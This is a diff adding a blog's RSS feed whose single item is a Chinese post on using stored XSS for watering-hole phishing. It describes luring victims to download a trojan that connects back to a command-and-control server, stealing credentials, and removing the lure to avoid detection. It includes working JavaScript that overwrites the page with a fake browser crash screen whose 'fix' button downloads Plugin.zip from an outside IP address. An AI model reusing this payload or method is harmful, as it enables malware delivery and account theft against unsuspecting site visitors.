@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>xss on Oulaa</title>
+    <link>/tags/xss/</link>
+    <description>Recent content in xss on Oulaa</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <copyright>&amp;copy; 2021 &lt;a href=&#34;https://www.wangchucheng.com/&#34;&gt;C. Wang&lt;/a&gt; and &lt;a href=&#34;https://www.ruiqima.com/&#34;&gt;R. Ma&lt;/a&gt;
+</copyright>
+    <lastBuildDate>Sun, 07 Nov 2021 00:00:00 +0000</lastBuildDate><atom:link href="/tags/xss/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>XSS钓鱼实现水坑攻击</title>
+      <link>/posts/xss1/</link>
+      <pubDate>Sun, 07 Nov 2021 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/xss1/</guid>
+      <description>一、简述 XSS我们不陌生，利用XSS可以做到许多的事，比如盗取cookie、钓鱼、获得内网地址、DDOS等等。这里简单学习一下利用XSS钓鱼。
+二、原理 一般需要一个存储型XSS。利用存储型XSS可以实现的目标可以有两种：
+ 1.直接诱导目标下载木马，达到直接上线的目的。这种情况最常见于Flash钓鱼，并且以此衍生各种版本，比如google崩溃页面、下载某插件之后才能访问等等。 2.诱导目标输入账号密码，达到窃取信息的目的。  这两种攻击方式需要考虑到下载之后如何自动判断上线，并且撤销钓鱼页面（也就是收杆），防止被发现攻击。
+而到达目标的线路也是我们需要考虑的，大概分为以下两种
+ 直接利用xss跳转到伪造的页面。优点是容易收杆，简单做个判断即可。缺点是容易被发现，毕竟做了跳转。 不进行跳转，直接利用xss加载伪造页面，收杆的话使用xss或服务端做判断，这里需要用到cs上线提醒。  三、实践 这里都是通过利用xss加载伪造页面完成的，防止被直接发现。
+诱导上线 这里直接使用了Google崩溃页面诱导：
+1 2 3 4 5  var body = document.body; var _left = window.innerWidth * 0.3 + &amp;#39;px&amp;#39;; var _top = window.innerHeight * 0.3 + &amp;#39;px&amp;#39;; var _height = window.innerHeight; body.innerHTML=`&amp;lt;div style=&amp;#34;background-color: white;height: ${_height}px&amp;#34;&amp;gt;&amp;lt;div style=&amp;#39;position:absolute;top:${_top};left:${_left};height:300px;width:600px;&amp;#39;&amp;gt;&amp;lt;img src=&amp;#39;https://files.catbox.moe/kgxxm1.png&amp;#39; style=&amp;#39;margin:3px;&amp;#39;&amp;gt;&amp;lt;p&amp;gt;&amp;lt;h3 &amp;gt;喔唷，崩溃啦!&amp;lt;/h3&amp;gt;&amp;lt;/p &amp;gt;&amp;lt;p style=&amp;#39;color:gray&amp;#39;&amp;gt;显示此网页时出了点问题，请在您的页面上启用显示插件，从而可能会有所帮助。&amp;lt;/br&amp;gt;&amp;lt;/p &amp;gt; &amp;lt;a href=&amp;#39;http://39.105.*.*/Plugin.zip&amp;#39;&amp;gt; &amp;lt;button style=&amp;#39;margin-left:85%;height:30px;line-hight:30px;outline:none;border:none;background-color:rgb(26,115,232);color:white&amp;#39; &amp;gt;立即修复&amp;lt;/button&amp;gt;&amp;lt;/a&amp;gt; &amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;`   1  &amp;lt;img style=&amp;#39;margin:3px;&amp;#39; src=&amp;#34;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAF4AAABOCAIAAAAmZjaiAAAACXBIWXMAABJ0AAASdAHeZh94AAAAEXRFWHRTb2Z0d2FyZQBTbmlwYXN0ZV0Xzt0AAAUoSURBVHic7ZzrT1NnHMd/50bsAdpBS7nIqQPcJaPcHeGmbpnCahVjZF6WzMxgTHxJMjP/hF1MzN67GTFxc3ObokiCy2YM4uLmuBR0WeTWlkSxp3KzJWnpsxeHMRz8gufSFJfn86o96fM9Tz99nnOe85znlCGEAGUl2ERXYO1C1aBQNShUDQpVg0LVoFA1KFQNClWDQtWgUDUoVA0Kv3zTmNd3/adfVKVwPOd21dszMgBgfn6+vaNzYuKxqoTyspLyshJVReLNCmqCwWBX921VKYIgbKmrUdQQQvo9Aw+GhlUl2Gzpa00N7VAoVA0Ko0xlLT2+pKQm5+bkqEohhHh9/nB4DgAYlnFIuaZ161QlBGQ5EAgqr8vLisvLSlUVjwcLxxpZ/vf4UlZacuC9vapSIpHIjZtdQ8MjAMDz/NbNtRsL8lUlXGq7ulgBqzV9LaihHQqFqkFZ4eStk1gsduVqR2pqqqpSXp9v8XVPb58sB1ctkpmZ4XY1sGy8ft24qOnzDOhJ8Pr8Xp9/1Y9tLMh3NWyPnxraoVCoGhRjOhTHcY07d8zMzBiS9pyE5+bOnvtaGZfZ7Ta3q4HjOAPzjVHDsmxJsdOQqOfnwdDwhe9+iEajAFCQn+dq2G6sGtqhUKgaFKoGhapBoWpQqBoUqgZF3bhmfj7mGRycnZlNS0srfON1ABgd8/r94yzLFjkLU1NTNNfD6/N7vT4AKHIWWizmqelpz8A9IESScjc4JM2xelCnJhqNXm5rHxkdKy5yKmru/H73WkenIAgnjrfoUfNHT++ltnYA+PijFovF/PDhoy/PtBJCGnfuSJQa2qFQ1LUanud3N7pnZ2Znnz49/VUrAGRk2I4cPsSyrHKnRTPlZaU2qxUAenr7bnX/Koqm5g8/AABJytUTqwd1ajiOLS0uAoB+z8A3334PAPv27qmrrdZfD4eU65ByAeDTk6fu//nXa6++cnB/E8Mw+pM1o04NIWRqejoaiYbn5pQfOUZigYDMMIzFYuZ57ReroVA4FAoBgMkk2qxWUTQFZJkBRhRNoihqjtWDui8TiUTOnjvv840X5OedON4CADdudn3y+Sle4I8dbdZzvOzqvt15/WcAeP9Ak2N/k88//tnJLwgh29556936bZpj9aC21cDk5FRAlnNysm22f1qNLAuCoEwOaCYUCgVkGZRWY7PKwWBAlgkhoVBYT6we1B9rSorW5+RI0nply8sbHHU11RzP6TlzA4BDkupqqgHgJYsZACxmc11NFSGQqDM3aDlD7XIv3VK5qaJyU4X+evxnpURWVmbz4UP6Y/VAxzUoVA0KVYNC1aBQNShUDYoB96GePJkcvHdfQ0GHQ3Ik7upxVQxQ4xsfP32mVUPBPbt3rWU1tEOhaGk1d3672+8ZXHybnCIe0TRyDciyMumzFLerPjs7S0Oa4WhRMzI6tnRhcbGz8OC+Jg05P16+snyBcm1N1QusJjlZVCZrFMxms7Z9i+IzOQrhcCgQkJduEQTBYtG4Cz1oUfP21i1VlW8uvk1KStK278211RXLVnqev3DR6724dEte3oZjR5vjt/oKQ2OrSU42YOZNFMXlM3jh8MLEzSLp6Wn696UB49fy6cRZWGhNf6aXZWXZEzJJvObUuF31ia7CAnRcg0LVoCDPQ91S9zxUQng08TgWi8Uvf+Wn6LRdE/3PoB0KhapBWehQVmu6chvoBcVutxk+XGboH0Jh0A6FQtWgUDUoVA0KVYNC1aBQNShUDQpVg0LVoPwNSQWN1SB9nloAAAAASUVORK5CYII=&amp;#34;&amp;gt;    图片可以直接去网上找这个小图标然后上传到图床。但是这样会有加载延迟，要么写时间延迟，要么将图片硬编码进去，这里我使用了图片的硬编码。</description>
+    </item>
+    
+  </channel>
+</rss>
